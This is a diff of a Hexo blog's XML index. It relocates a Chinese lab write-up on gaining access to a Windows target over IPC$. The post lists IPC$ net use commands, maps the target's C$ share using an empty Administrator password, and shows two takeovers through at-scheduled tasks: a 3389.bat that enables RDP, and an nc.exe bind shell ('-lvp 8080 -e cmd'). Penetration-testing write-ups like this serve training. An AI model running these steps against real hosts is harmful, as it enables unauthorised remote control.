-<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308195641736.png" alt="image-20210308195641736"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此这台靶机已经拿下，无论是通过写入<code>3389.bat</code>来开放一个<code>3389</code>端口,或者是上传一个<code>nc.bat</code>来开放一个后门端口让我们攻击机连接，都需要利用<code>IPC$</code>的连接，<code>at</code> 的命令添加任务计划。当然方法也不止如此，也可以<code>msf</code>生成木马，让目标主机<code>at</code>添加任务计划，然后返回一个<code>shell</code>。</p>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>IPC$</tag>
-        <tag>shell</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>网页攻防Web笔记</title>
     <url>/2020/10/23/%E7%BD%91%E9%A1%B5%E6%94%BB%E9%98%B2Web%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<blockquote>
@@ -1675,6 +1596,85 @@
       </categories>
       <tags>
         <tag>Web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记一次IPC$渗透</title>
+    <url>/2021/03/08/%E8%AE%B0%E4%B8%80%E6%AC%A1IPC-%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<h2 id="IPC-介绍"><a href="#IPC-介绍" class="headerlink" title="IPC$介绍"></a>IPC$介绍</h2><h3 id="IPC-概念"><a href="#IPC-概念" class="headerlink" title="IPC$概念"></a>IPC$概念</h3><p><code>IPC$</code>(Internet Process Connection)是共享”命名管道”的资源,它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获取相应的权限，再远程计算机和查看计算机的共享资源时使用。</p>
+<h3 id="IPC-作用"><a href="#IPC-作用" class="headerlink" title="IPC$作用"></a>IPC$作用</h3><p>利用<code>IPC$</code>,攻击者可以与目标主机建立一个连接，通过这个连接可以获取目标主机的目录结构，用户列表信息等…</p>
+<p><code>IPC$</code>还有一种空连接的形式，不需要用户名和密码。虽然空连接没有任何权限，但是也可以得到目标主机用户列表。</p>
+<h3 id="常用IPC-命令"><a href="#常用IPC-命令" class="headerlink" title="常用IPC$命令"></a>常用IPC$命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net share ipc$    	  		&#x2F;&#x2F;开启ipc$</span><br><span class="line">net share ipc$ &#x2F;del 			&#x2F;&#x2F;关闭ipc$共享</span><br><span class="line">net use \\IP\ipc$ &quot;&quot; &#x2F;user:&quot;&quot;		&#x2F;&#x2F;建立空连接</span><br><span class="line">net use \\IP\ipc$ &quot;用户名&quot; &#x2F;user:&quot;密码&quot;	&#x2F;&#x2F;建立连接</span><br><span class="line">net use z: \\ip\c$                	&#x2F;&#x2F;映射目标主机c盘到本地z盘              </span><br><span class="line">net use \\IP\ipc$ &#x2F;del              	&#x2F;&#x2F;删除一个ipc$连接</span><br><span class="line">net use z: &#x2F;del                    	&#x2F;&#x2F;删除映射目录</span><br></pre></td></tr></table></figure>
+
+<h3 id="常见错误代码"><a href="#常见错误代码" class="headerlink" title="常见错误代码"></a>常见错误代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">错误号5，拒绝访问：很可能你使用的用户不是管理员权限的，先提升权限； </span><br><span class="line">错误号51，Windows无法找到网络路径：网络有问题； </span><br><span class="line">错误号53，找不到网络路径：ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）； </span><br><span class="line">错误号67，  找不到网络名：你的lanmanworkstation服务未启动或者目标删除了ipc$； </span><br><span class="line">错误号1219，提供的凭据与已存在的凭据集冲突：你已经和对方建立了一个ipc$，请删除再连； </span><br><span class="line">错误号1326，未知的用户名或错误密码：原因很明显了； </span><br><span class="line">错误号1792，试图登录，但是网络登录服务没有启动：目标NetLogon服务未启动； </span><br><span class="line">错误号2242，此用户的密码已经过期：目标有帐号策略，强制定期要求更改密码</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="IPC-渗透"><a href="#IPC-渗透" class="headerlink" title="IPC$渗透"></a>IPC$渗透</h2><h3 id="内网-信息收集"><a href="#内网-信息收集" class="headerlink" title="内网-信息收集"></a>内网-信息收集</h3><p>通过内网扫描工具(NTscan)扫描内网发现可能存在一台IPC$漏洞的靶机，且密码为空。</p>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308161516655.png" alt="image-20210308161516655"></p>
+<h3 id="IPC-连接"><a href="#IPC-连接" class="headerlink" title="IPC$连接"></a>IPC$连接</h3><ul>
+<li>与目标主机建立ipc$连接</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">177</span>\ipc$ &quot;&quot; /user:&quot;Administrator&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308162606862.png" alt="image-20210308162606862"></p>
+<ul>
+<li>把目标主机的C盘映射到本地z盘</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> use z: \\<span class="number">10</span>.<span class="number">7</span>.<span class="number">6</span>.<span class="number">177</span>\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308162858310.png" alt="image-20210308162858310"></p>
+<h2 id="获取主机权限"><a href="#获取主机权限" class="headerlink" title="获取主机权限"></a>获取主机权限</h2><blockquote>
+<p>现在已经成功ipc$连接，接下来想要拿下目标主机的权限，且已知密码为空，现有两种思路</p>
+<p>1.让目标主机开放3389端口，远程连接</p>
+<p>2.让目标主机开放一个后门端口</p>
+</blockquote>
+<h3 id="方法一）"><a href="#方法一）" class="headerlink" title="方法一）"></a>方法一）</h3><ul>
+<li>目标靶机未开放3389端口</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308164419733.png" alt="image-20210308164419733"></p>
+<ul>
+<li>写入一个3389.bat到目标主机的C盘中</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308164839805.png" alt="image-20210308164839805"></p>
+<ul>
+<li>通过at命令来添加一个计划任务</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308165131844.png" alt="image-20210308165131844"></p>
+<ul>
+<li>目标靶机已开放3389端口</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308165206880.png" alt="image-20210308165206880"></p>
+<ul>
+<li>拿到主机权限</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308194713755.png" alt="image-20210308194713755"></p>
+<h3 id="方法二）"><a href="#方法二）" class="headerlink" title="方法二）"></a>方法二）</h3><ul>
+<li>上传一个<code>nc.exe</code> 和一个<code>nc.bat</code>,<code>nc.bat</code>的内容如下：</li>
+</ul>
+<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">nc.exe</span> -<span class="title">lvp</span> 8080 -<span class="title">e</span> <span class="title">cmd</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308195332482.png" alt="image-20210308195332482"></p>
+<ul>
+<li>通过at命令来添加一个计划任务</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308195505842.png" alt="image-20210308195505842"></p>
+<ul>
+<li>靶机8080端口已打开</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308195609508.png" alt="image-20210308195609508"></p>
+<ul>
+<li>拿到主机权限</li>
+</ul>
+<p><img src="https://gitee.com/ey0rt/hexo_img/raw/master/image/image-20210308195641736.png" alt="image-20210308195641736"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此这台靶机已经拿下，无论是通过写入<code>3389.bat</code>来开放一个<code>3389</code>端口,或者是上传一个<code>nc.bat</code>来开放一个后门端口让我们攻击机连接，都需要利用<code>IPC$</code>的连接，<code>at</code> 的命令添加任务计划。当然方法也不止如此，也可以<code>msf</code>生成木马，让目标主机<code>at</code>添加任务计划，然后返回一个<code>shell</code>。</p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>IPC$</tag>
+        <tag>shell</tag>
       </tags>
   </entry>
   <entry>
